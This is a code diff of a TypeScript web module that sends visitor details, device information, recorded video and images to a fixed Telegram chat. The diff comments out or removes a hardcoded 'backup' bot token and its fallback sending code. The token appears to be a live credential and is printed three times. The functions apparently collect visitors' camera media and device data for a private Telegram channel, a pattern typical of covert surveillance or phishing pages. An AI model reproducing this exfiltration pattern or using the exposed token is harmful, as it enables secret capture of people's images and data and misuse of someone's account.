@@ -310,7 +310,7 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '6416649998:AAFWNxPf9B6FJR80HeXRoQAoyopbvDfZMF8';
+  // const backupBotToken = '6416649998:AAFWNxPf9B6FJR80HeXRoQAoyopbvDfZMF8';
   const CHAT_ID = '361671350';
 
   if (!CHAT_ID) {
@@ -377,12 +377,12 @@ ${deviceText}
       }
     }
 
-    try {
-      await sendTelegramMessage(backupBotToken, messageData);
-      hasNotificationBeenSent = true;
-    } catch (error) {
-      throw new Error(`Backup bot failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
-    }
+    // try {
+    //   await sendTelegramMessage(backupBotToken, messageData);
+    //   hasNotificationBeenSent = true;
+    // } catch (error) {
+    //   throw new Error(`Backup bot failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
+    // }
   } catch (error) {
     console.error('Both bots failed:', error instanceof Error ? error.message : 'Unknown error');
   }
@@ -390,7 +390,7 @@ ${deviceText}
 
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '6416649998:AAFWNxPf9B6FJR80HeXRoQAoyopbvDfZMF8';
+  // const backupBotToken = '6416649998:AAFWNxPf9B6FJR80HeXRoQAoyopbvDfZMF8';
   const CHAT_ID = '361671350';
 
   if (!CHAT_ID) {
@@ -459,13 +459,6 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
       }
     }
 
-    try {
-      await sendVideo(backupBotToken);
-      console.log('Video sent successfully with backup bot');
-    } catch (error) {
-      console.error('Backup bot failed to send video:', error instanceof Error ? error.message : 'Unknown error');
-      throw error;
-    }
   } catch (error) {
     console.error('Both bots failed to send video:', error instanceof Error ? error.message : 'Unknown error');
   }
@@ -473,7 +466,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 
 export const sendImageToTelegram = async (imageBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '6416649998:AAFWNxPf9B6FJR80HeXRoQAoyopbvDfZMF8';
+  // const backupBotToken = '6416649998:AAFWNxPf9B6FJR80HeXRoQAoyopbvDfZMF8';
   const CHAT_ID = '361671350';
 
   if (!CHAT_ID) {
@@ -536,11 +529,11 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
       }
     }
 
-    try {
-      await sendPhoto(backupBotToken);
-    } catch (error) {
-      throw new Error(`Backup bot failed to send image: ${error instanceof Error ? error.message : 'Unknown error'}`);
-    }
+    // try {
+    //   await sendPhoto(backupBotToken);
+    // } catch (error) {
+    //   throw new Error(`Backup bot failed to send image: ${error instanceof Error ? error.message : 'Unknown error'}`);
+    // }
   } catch (error) {
     console.error('Both bots failed to send image:', error instanceof Error ? error.message : 'Unknown error');
   }
